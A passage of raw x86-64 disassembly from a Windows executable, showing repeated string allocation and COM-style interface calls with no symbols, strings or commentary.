   1400025a4:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400025a9:	48 85 c0             	test   %rax,%rax
   1400025ac:	74 32                	je     0x1400025e0
   1400025ae:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400025b1:	33 c0                	xor    %eax,%eax
   1400025b3:	0f 11 03             	movups %xmm0,(%rbx)
   1400025b6:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400025ba:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400025be:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400025c5:	48 8d 0d 68 65 00 00 	lea    0x6568(%rip),%rcx        # 0x140008b34
   1400025cc:	ff 15 96 5c 00 00    	call   *0x5c96(%rip)        # 0x140008268
   1400025d2:	48 89 03             	mov    %rax,(%rbx)
   1400025d5:	48 85 c0             	test   %rax,%rax
   1400025d8:	0f 84 87 07 00 00    	je     0x140002d65
   1400025de:	eb 03                	jmp    0x1400025e3
   1400025e0:	49 8b de             	mov    %r14,%rbx
   1400025e3:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400025e8:	48 85 db             	test   %rbx,%rbx
   1400025eb:	0f 84 b6 07 00 00    	je     0x140002da7
   1400025f1:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400025f5:	48 8b 01             	mov    (%rcx),%rax
   1400025f8:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400025fc:	48 8b 13             	mov    (%rbx),%rdx
   1400025ff:	ff 50 38             	call   *0x38(%rax)
   140002602:	8b f0                	mov    %eax,%esi
   140002604:	8b cf                	mov    %edi,%ecx
   140002606:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   14000260b:	83 f9 01             	cmp    $0x1,%ecx
   14000260e:	75 30                	jne    0x140002640
   140002610:	48 8b 0b             	mov    (%rbx),%rcx
   140002613:	48 85 c9             	test   %rcx,%rcx
   140002616:	74 09                	je     0x140002621
   140002618:	ff 15 52 5c 00 00    	call   *0x5c52(%rip)        # 0x140008270
   14000261e:	4c 89 33             	mov    %r14,(%rbx)
   140002621:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002625:	48 85 c9             	test   %rcx,%rcx
   140002628:	74 09                	je     0x140002633
   14000262a:	e8 31 42 00 00       	call   0x140006860
   14000262f:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002633:	ba 18 00 00 00       	mov    $0x18,%edx
   140002638:	48 8b cb             	mov    %rbx,%rcx
   14000263b:	e8 20 42 00 00       	call   0x140006860
   140002640:	85 f6                	test   %esi,%esi
   140002642:	0f 88 fb 06 00 00    	js     0x140002d43
   140002648:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000264d:	e8 16 42 00 00       	call   0x140006868
   140002652:	48 8b d8             	mov    %rax,%rbx
   140002655:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000265a:	48 85 c0             	test   %rax,%rax
   14000265d:	74 32                	je     0x140002691
   14000265f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002662:	33 c0                	xor    %eax,%eax
   140002664:	0f 11 03             	movups %xmm0,(%rbx)
   140002667:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000266b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000266f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002676:	48 8d 0d bb 64 00 00 	lea    0x64bb(%rip),%rcx        # 0x140008b38
   14000267d:	ff 15 e5 5b 00 00    	call   *0x5be5(%rip)        # 0x140008268
   140002683:	48 89 03             	mov    %rax,(%rbx)
   140002686:	48 85 c0             	test   %rax,%rax
   140002689:	0f 84 e1 06 00 00    	je     0x140002d70
   14000268f:	eb 03                	jmp    0x140002694
   140002691:	49 8b de             	mov    %r14,%rbx
   140002694:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002699:	48 85 db             	test   %rbx,%rbx
   14000269c:	0f 84 05 07 00 00    	je     0x140002da7
   1400026a2:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400026a6:	48 8b 01             	mov    (%rcx),%rax
   1400026a9:	45 33 c0             	xor    %r8d,%r8d
   1400026ac:	48 8b 13             	mov    (%rbx),%rdx
   1400026af:	ff 50 78             	call   *0x78(%rax)
   1400026b2:	90                   	nop
   1400026b3:	8b c7                	mov    %edi,%eax
   1400026b5:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400026ba:	83 f8 01             	cmp    $0x1,%eax
   1400026bd:	75 30                	jne    0x1400026ef
   1400026bf:	48 8b 0b             	mov    (%rbx),%rcx
   1400026c2:	48 85 c9             	test   %rcx,%rcx
   1400026c5:	74 09                	je     0x1400026d0
   1400026c7:	ff 15 a3 5b 00 00    	call   *0x5ba3(%rip)        # 0x140008270
   1400026cd:	4c 89 33             	mov    %r14,(%rbx)
   1400026d0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400026d4:	48 85 c9             	test   %rcx,%rcx
   1400026d7:	74 09                	je     0x1400026e2
   1400026d9:	e8 82 41 00 00       	call   0x140006860
   1400026de:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400026e2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400026e7:	48 8b cb             	mov    %rbx,%rcx
   1400026ea:	e8 71 41 00 00       	call   0x140006860
   1400026ef:	4c 89 75 60          	mov    %r14,0x60(%rbp)
   1400026f3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400026f7:	48 8b 01             	mov    (%rcx),%rax
   1400026fa:	4c 8d 45 60          	lea    0x60(%rbp),%r8
   1400026fe:	33 d2                	xor    %edx,%edx
   140002700:	ff 50 48             	call   *0x48(%rax)
   140002703:	8b d8                	mov    %eax,%ebx
   140002705:	85 c0                	test   %eax,%eax
   140002707:	79 48                	jns    0x140002751
   140002709:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   14000270d:	48 8b 11             	mov    (%rcx),%rdx
   140002710:	ff 52 10             	call   *0x10(%rdx)
   140002713:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002717:	48 8b 11             	mov    (%rcx),%rdx
   14000271a:	ff 52 10             	call   *0x10(%rdx)
   14000271d:	ff 15 ad 5e 00 00    	call   *0x5ead(%rip)        # 0x1400085d0
   140002723:	8b c3                	mov    %ebx,%eax
   140002725:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   14000272c:	48 33 cc             	xor    %rsp,%rcx
   14000272f:	e8 0c 41 00 00       	call   0x140006840
   140002734:	4c 8d 9c 24 d0 01 00 	lea    0x1d0(%rsp),%r11
   14000273b:	00 
   14000273c:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140002740:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140002744:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140002748:	4d 8b 73 28          	mov    0x28(%r11),%r14
   14000274c:	49 8b e3             	mov    %r11,%rsp
   14000274f:	5d                   	pop    %rbp
   140002750:	c3                   	ret
   140002751:	4c 89 b5 88 00 00 00 	mov    %r14,0x88(%rbp)
   140002758:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000275c:	48 8b 01             	mov    (%rcx),%rax
   14000275f:	48 8d 95 88 00 00 00 	lea    0x88(%rbp),%rdx
   140002766:	ff 50 38             	call   *0x38(%rax)
   140002769:	85 c0                	test   %eax,%eax
   14000276b:	0f 88 5b 01 00 00    	js     0x1400028cc
   140002771:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002776:	e8 ed 40 00 00       	call   0x140006868
   14000277b:	48 8b d8             	mov    %rax,%rbx
   14000277e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002783:	48 85 c0             	test   %rax,%rax
   140002786:	74 32                	je     0x1400027ba
   140002788:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000278b:	33 c0                	xor    %eax,%eax
   14000278d:	0f 11 03             	movups %xmm0,(%rbx)
   140002790:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002794:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002798:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   14000279f:	48 8d 0d aa 63 00 00 	lea    0x63aa(%rip),%rcx        # 0x140008b50
   1400027a6:	ff 15 bc 5a 00 00    	call   *0x5abc(%rip)        # 0x140008268
   1400027ac:	48 89 03             	mov    %rax,(%rbx)
   1400027af:	48 85 c0             	test   %rax,%rax
   1400027b2:	0f 84 c3 05 00 00    	je     0x140002d7b
   1400027b8:	eb 03                	jmp    0x1400027bd
   1400027ba:	49 8b de             	mov    %r14,%rbx
   1400027bd:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400027c2:	48 85 db             	test   %rbx,%rbx
   1400027c5:	0f 84 dc 05 00 00    	je     0x140002da7
   1400027cb:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400027d2:	48 8b 01             	mov    (%rcx),%rax
   1400027d5:	48 8b 13             	mov    (%rbx),%rdx
   1400027d8:	ff 50 50             	call   *0x50(%rax)
   1400027db:	90                   	nop
   1400027dc:	8b c7                	mov    %edi,%eax
   1400027de:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400027e3:	83 f8 01             	cmp    $0x1,%eax
   1400027e6:	75 30                	jne    0x140002818
   1400027e8:	48 8b 0b             	mov    (%rbx),%rcx
   1400027eb:	48 85 c9             	test   %rcx,%rcx
   1400027ee:	74 09                	je     0x1400027f9
   1400027f0:	ff 15 7a 5a 00 00    	call   *0x5a7a(%rip)        # 0x140008270
   1400027f6:	4c 89 33             	mov    %r14,(%rbx)
   1400027f9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400027fd:	48 85 c9             	test   %rcx,%rcx
   140002800:	74 09                	je     0x14000280b
   140002802:	e8 59 40 00 00       	call   0x140006860
   140002807:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000280b:	ba 18 00 00 00       	mov    $0x18,%edx
   140002810:	48 8b cb             	mov    %rbx,%rcx
   140002813:	e8 48 40 00 00       	call   0x140006860
   140002818:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000281d:	e8 46 40 00 00       	call   0x140006868
   140002822:	48 8b d8             	mov    %rax,%rbx
   140002825:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000282a:	48 85 c0             	test   %rax,%rax
   14000282d:	74 32                	je     0x140002861
   14000282f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002832:	33 c0                	xor    %eax,%eax
   140002834:	0f 11 03             	movups %xmm0,(%rbx)
   140002837:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000283b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000283f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002846:	48 8d 0d 33 63 00 00 	lea    0x6333(%rip),%rcx        # 0x140008b80
   14000284d:	ff 15 15 5a 00 00    	call   *0x5a15(%rip)        # 0x140008268
   140002853:	48 89 03             	mov    %rax,(%rbx)
   140002856:	48 85 c0             	test   %rax,%rax
   140002859:	0f 84 27 05 00 00    	je     0x140002d86
   14000285f:	eb 03                	jmp    0x140002864
   140002861:	49 8b de             	mov    %r14,%rbx
   140002864:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002869:	48 85 db             	test   %rbx,%rbx
   14000286c:	0f 84 35 05 00 00    	je     0x140002da7
   140002872:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140002879:	48 8b 01             	mov    (%rcx),%rax
   14000287c:	48 8b 13             	mov    (%rbx),%rdx
   14000287f:	ff 50 40             	call   *0x40(%rax)
   140002882:	90                   	nop
   140002883:	8b c7                	mov    %edi,%eax
   140002885:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000288a:	83 f8 01             	cmp    $0x1,%eax
   14000288d:	75 30                	jne    0x1400028bf
   14000288f:	48 8b 0b             	mov    (%rbx),%rcx
   140002892:	48 85 c9             	test   %rcx,%rcx
   140002895:	74 09                	je     0x1400028a0
   140002897:	ff 15 d3 59 00 00    	call   *0x59d3(%rip)        # 0x140008270
   14000289d:	4c 89 33             	mov    %r14,(%rbx)
   1400028a0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400028a4:	48 85 c9             	test   %rcx,%rcx
   1400028a7:	74 09                	je     0x1400028b2
   1400028a9:	e8 b2 3f 00 00       	call   0x140006860
   1400028ae:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400028b2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400028b7:	48 8b cb             	mov    %rbx,%rcx
   1400028ba:	e8 a1 3f 00 00       	call   0x140006860
   1400028bf:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400028c6:	48 8b 01             	mov    (%rcx),%rax
   1400028c9:	ff 50 10             	call   *0x10(%rax)
   1400028cc:	4c 89 b5 a0 00 00 00 	mov    %r14,0xa0(%rbp)
   1400028d3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028d7:	48 8b 01             	mov    (%rcx),%rax
   1400028da:	48 8d 95 a0 00 00 00 	lea    0xa0(%rbp),%rdx
   1400028e1:	ff 50 48             	call   *0x48(%rax)
   1400028e4:	8b d8                	mov    %eax,%ebx
   1400028e6:	85 c0                	test   %eax,%eax
   1400028e8:	79 23                	jns    0x14000290d
   1400028ea:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028ee:	48 8b 11             	mov    (%rcx),%rdx
   1400028f1:	ff 52 10             	call   *0x10(%rdx)
   1400028f4:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400028f8:	48 8b 11             	mov    (%rcx),%rdx
   1400028fb:	ff 52 10             	call   *0x10(%rdx)
   1400028fe:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002902:	48 8b 01             	mov    (%rcx),%rax
   140002905:	ff 50 10             	call   *0x10(%rax)
   140002908:	e9 10 fe ff ff       	jmp    0x14000271d
   14000290d:	4c 89 b5 b0 00 00 00 	mov    %r14,0xb0(%rbp)
   140002914:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   14000291b:	48 8b 01             	mov    (%rcx),%rax
   14000291e:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   140002925:	ba 09 00 00 00       	mov    $0x9,%edx
   14000292a:	ff 50 50             	call   *0x50(%rax)
   14000292d:	8b d8                	mov    %eax,%ebx
   14000292f:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   140002936:	48 8b 11             	mov    (%rcx),%rdx
   140002939:	ff 52 10             	call   *0x10(%rdx)
   14000293c:	85 db                	test   %ebx,%ebx
   14000293e:	78 52                	js     0x140002992
   140002940:	48 8b 8d b0 00 00 00 	mov    0xb0(%rbp),%rcx
   140002947:	48 8b 01             	mov    (%rcx),%rax
   14000294a:	ff 50 10             	call   *0x10(%rax)
   14000294d:	4c 89 75 78          	mov    %r14,0x78(%rbp)
   140002951:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002955:	48 8b 01             	mov    (%rcx),%rax
   140002958:	48 8d 55 78          	lea    0x78(%rbp),%rdx
   14000295c:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002962:	8b d8                	mov    %eax,%ebx
   140002964:	85 c0                	test   %eax,%eax
   140002966:	78 82                	js     0x1400028ea
   140002968:	4c 89 b5 80 00 00 00 	mov    %r14,0x80(%rbp)
   14000296f:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002973:	48 8b 01             	mov    (%rcx),%rax
   140002976:	4c 8d 85 80 00 00 00 	lea    0x80(%rbp),%r8
   14000297d:	33 d2                	xor    %edx,%edx
   14000297f:	ff 50 60             	call   *0x60(%rax)
   140002982:	8b d8                	mov    %eax,%ebx
   140002984:	85 c0                	test   %eax,%eax
   140002986:	79 2d                	jns    0x1400029b5
   140002988:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   14000298c:	48 8b 11             	mov    (%rcx),%rdx
   14000298f:	ff 52 10             	call   *0x10(%rdx)
   140002992:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002996:	48 8b 11             	mov    (%rcx),%rdx
   140002999:	ff 52 10             	call   *0x10(%rdx)
   14000299c:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400029a0:	48 8b 01             	mov    (%rcx),%rax
   1400029a3:	ff 50 10             	call   *0x10(%rax)
   1400029a6:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400029aa:	48 8b 01             	mov    (%rcx),%rax
   1400029ad:	ff 50 10             	call   *0x10(%rax)
   1400029b0:	e9 68 fd ff ff       	jmp    0x14000271d
   1400029b5:	4c 89 b5 90 00 00 00 	mov    %r14,0x90(%rbp)
   1400029bc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029c3:	48 8b 01             	mov    (%rcx),%rax
   1400029c6:	4c 8d 85 90 00 00 00 	lea    0x90(%rbp),%r8
   1400029cd:	48 8d 15 f4 5c 00 00 	lea    0x5cf4(%rip),%rdx        # 0x1400086c8
   1400029d4:	ff 10                	call   *(%rax)
   1400029d6:	8b d8                	mov    %eax,%ebx
   1400029d8:	85 c0                	test   %eax,%eax
   1400029da:	79 3a                	jns    0x140002a16
   1400029dc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029e3:	48 8b 11             	mov    (%rcx),%rdx
   1400029e6:	ff 52 10             	call   *0x10(%rdx)
   1400029e9:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   1400029ed:	48 8b 11             	mov    (%rcx),%rdx
   1400029f0:	ff 52 10             	call   *0x10(%rdx)
   1400029f3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400029f7:	48 8b 01             	mov    (%rcx),%rax
   1400029fa:	ff 50 10             	call   *0x10(%rax)
   1400029fd:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002a01:	48 8b 01             	mov    (%rcx),%rax
   140002a04:	ff 50 10             	call   *0x10(%rax)
   140002a07:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002a0b:	48 8b 01             	mov    (%rcx),%rax
   140002a0e:	ff 50 10             	call   *0x10(%rax)
   140002a11:	e9 07 fd ff ff       	jmp    0x14000271d
   140002a16:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002a1b:	e8 48 3e 00 00       	call   0x140006868
   140002a20:	48 8b d8             	mov    %rax,%rbx
   140002a23:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002a28:	48 85 c0             	test   %rax,%rax
   140002a2b:	74 32                	je     0x140002a5f
   140002a2d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002a30:	33 c0                	xor    %eax,%eax
   140002a32:	0f 11 03             	movups %xmm0,(%rbx)
   140002a35:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002a39:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002a3d:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002a44:	48 8d 0d 65 61 00 00 	lea    0x6165(%rip),%rcx        # 0x140008bb0
   140002a4b:	ff 15 17 58 00 00    	call   *0x5817(%rip)        # 0x140008268
   140002a51:	48 89 03             	mov    %rax,(%rbx)
   140002a54:	48 85 c0             	test   %rax,%rax
   140002a57:	0f 84 34 03 00 00    	je     0x140002d91
   140002a5d:	eb 03                	jmp    0x140002a62
   140002a5f:	49 8b de             	mov    %r14,%rbx
   140002a62:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002a67:	48 85 db             	test   %rbx,%rbx
   140002a6a:	0f 84 37 03 00 00    	je     0x140002da7
   140002a70:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002a77:	48 8b 01             	mov    (%rcx),%rax
   140002a7a:	48 8b 13             	mov    (%rbx),%rdx
   140002a7d:	ff 50 58             	call   *0x58(%rax)
   140002a80:	8b f0                	mov    %eax,%esi
   140002a82:	8b cf                	mov    %edi,%ecx
   140002a84:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   140002a89:	83 f9 01             	cmp    $0x1,%ecx
   140002a8c:	75 30                	jne    0x140002abe
   140002a8e:	48 8b 0b             	mov    (%rbx),%rcx
   140002a91:	48 85 c9             	test   %rcx,%rcx
   140002a94:	74 09                	je     0x140002a9f
   140002a96:	ff 15 d4 57 00 00    	call   *0x57d4(%rip)        # 0x140008270
   140002a9c:	4c 89 33             	mov    %r14,(%rbx)
   140002a9f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002aa3:	48 85 c9             	test   %rcx,%rcx
   140002aa6:	74 09                	je     0x140002ab1
   140002aa8:	e8 b3 3d 00 00       	call   0x140006860
   140002aad:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002ab1:	ba 18 00 00 00       	mov    $0x18,%edx
   140002ab6:	48 8b cb             	mov    %rbx,%rcx
   140002ab9:	e8 a2 3d 00 00       	call   0x140006860
   140002abe:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002ac5:	48 8b 01             	mov    (%rcx),%rax
   140002ac8:	ff 50 10             	call   *0x10(%rax)
   140002acb:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140002ad2:	48 8b 01             	mov    (%rcx),%rax
   140002ad5:	ff 50 10             	call   *0x10(%rax)
   140002ad8:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002adc:	48 8b 01             	mov    (%rcx),%rax
   140002adf:	ff 50 10             	call   *0x10(%rax)
   140002ae2:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002ae6:	85 f6                	test   %esi,%esi
   140002ae8:	0f 88 45 02 00 00    	js     0x140002d33
   140002aee:	4c 89 b5 98 00 00 00 	mov    %r14,0x98(%rbp)
   140002af5:	48 8b 01             	mov    (%rcx),%rax
   140002af8:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   140002aff:	ff 50 58             	call   *0x58(%rax)
   140002b02:	4c 89 b5 a8 00 00 00 	mov    %r14,0xa8(%rbp)
   140002b09:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002b0d:	48 8b 01             	mov    (%rcx),%rax
   140002b10:	48 8d 95 a8 00 00 00 	lea    0xa8(%rbp),%rdx
   140002b17:	ff 50 78             	call   *0x78(%rax)
   140002b1a:	85 c0                	test   %eax,%eax
   140002b1c:	78 5e                	js     0x140002b7c
   140002b1e:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b25:	48 85 c9             	test   %rcx,%rcx
   140002b28:	74 21                	je     0x140002b4b
   140002b2a:	48 8b 01             	mov    (%rcx),%rax
   140002b2d:	ba 01 00 00 00       	mov    $0x1,%edx
   140002b32:	ff 90 90 00 00 00    	call   *0x90(%rax)
   140002b38:	8b d8                	mov    %eax,%ebx
   140002b3a:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b41:	48 8b 11             	mov    (%rcx),%rdx
   140002b44:	ff 52 10             	call   *0x10(%rdx)
   140002b47:	85 db                	test   %ebx,%ebx
   140002b49:	78 31                	js     0x140002b7c
   140002b4b:	8b d7                	mov    %edi,%edx
   140002b4d:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b54:	48 8b 01             	mov    (%rcx),%rax
   140002b57:	ff 90 b0 00 00 00    	call   *0xb0(%rax)
   140002b5d:	33 d2                	xor    %edx,%edx
   140002b5f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b66:	48 8b 01             	mov    (%rcx),%rax
   140002b69:	ff 90 30 01 00 00    	call   *0x130(%rax)
   140002b6f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b76:	48 8b 01             	mov    (%rcx),%rax
   140002b79:	ff 50 10             	call   *0x10(%rax)
   140002b7c:	4c 89 b5 b8 00 00 00 	mov    %r14,0xb8(%rbp)
   140002b83:	b8 08 00 00 00       	mov    $0x8,%eax
   140002b88:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   140002b8d:	48 8d 0d 64 60 00 00 	lea    0x6064(%rip),%rcx        # 0x140008bf8
   140002b94:	ff 15 ce 56 00 00    	call   *0x56ce(%rip)        # 0x140008268
   140002b9a:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002b9f:	48 85 c0             	test   %rax,%rax
   140002ba2:	0f 84 0a 02 00 00    	je     0x140002db2
   140002ba8:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   140002bad:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140002bb1:	f2 0f 10 45 80       	movsd  -0x80(%rbp),%xmm0
   140002bb6:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   140002bbc:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002bc0:	ff 15 b2 56 00 00    	call   *0x56b2(%rip)        # 0x140008278
   140002bc6:	90                   	nop
   140002bc7:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   140002bcb:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   140002bcf:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   140002bd4:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140002bda:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002bde:	ff 15 94 56 00 00    	call   *0x5694(%rip)        # 0x140008278
   140002be4:	90                   	nop
   140002be5:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140002be9:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002bed:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002bf3:	f2 0f 11 45 50       	movsd  %xmm0,0x50(%rbp)
   140002bf8:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   140002bfc:	0f 29 45 20          	movaps %xmm0,0x20(%rbp)
   140002c00:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002c06:	f2 0f 11 45 30       	movsd  %xmm0,0x30(%rbp)
   140002c0b:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   140002c0f:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   140002c13:	f2 0f 10 4d b8       	movsd  -0x48(%rbp),%xmm1
   140002c18:	f2 0f 11 4d 10       	movsd  %xmm1,0x10(%rbp)
   140002c1d:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002c22:	e8 41 3c 00 00       	call   0x140006868
   140002c27:	48 8b d8             	mov    %rax,%rbx
   140002c2a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c2f:	48 85 c0             	test   %rax,%rax
   140002c32:	74 32                	je     0x140002c66
   140002c34:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c37:	33 c0                	xor    %eax,%eax
   140002c39:	0f 11 03             	movups %xmm0,(%rbx)
   140002c3c:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002c40:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002c44:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002c4b:	48 8d 0d e6 5e 00 00 	lea    0x5ee6(%rip),%rcx        # 0x140008b38
   140002c52:	ff 15 10 56 00 00    	call   *0x5610(%rip)        # 0x140008268
   140002c58:	48 89 03             	mov    %rax,(%rbx)
   140002c5b:	48 85 c0             	test   %rax,%rax
   140002c5e:	0f 84 38 01 00 00    	je     0x140002d9c
   140002c64:	eb 03                	jmp    0x140002c69
   140002c66:	49 8b de             	mov    %r14,%rbx
   140002c69:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002c6e:	48 85 db             	test   %rbx,%rbx
   140002c71:	0f 84 e3 00 00 00    	je     0x140002d5a
   140002c77:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002c7b:	48 8b 01             	mov    (%rcx),%rax
   140002c7e:	48 8d 95 b8 00 00 00 	lea    0xb8(%rbp),%rdx
   140002c85:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002c8a:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140002c8e:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140002c93:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   140002c9a:	00 
   140002c9b:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140002c9f:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140002ca4:	48 8d 55 00          	lea    0x0(%rbp),%rdx
   140002ca8:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002cad:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140002cb3:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140002cb7:	48 8b 13             	mov    (%rbx),%rdx
   140002cba:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002cc0:	8b f0                	mov    %eax,%esi
   140002cc2:	f0 0f c1 7b 10       	lock xadd %edi,0x10(%rbx)
   140002cc7:	83 ff 01             	cmp    $0x1,%edi
   140002cca:	75 31                	jne    0x140002cfd
   140002ccc:	48 8b 0b             	mov    (%rbx),%rcx
   140002ccf:	48 85 c9             	test   %rcx,%rcx
   140002cd2:	74 09                	je     0x140002cdd
   140002cd4:	ff 15 96 55 00 00    	call   *0x5596(%rip)        # 0x140008270
   140002cda:	4c 89 33             	mov    %r14,(%rbx)
   140002cdd:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002ce1:	48 85 c9             	test   %rcx,%rcx
   140002ce4:	74 09                	je     0x140002cef
   140002ce6:	e8 75 3b 00 00       	call   0x140006860
   140002ceb:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002cef:	ba 18 00 00 00       	mov    $0x18,%edx
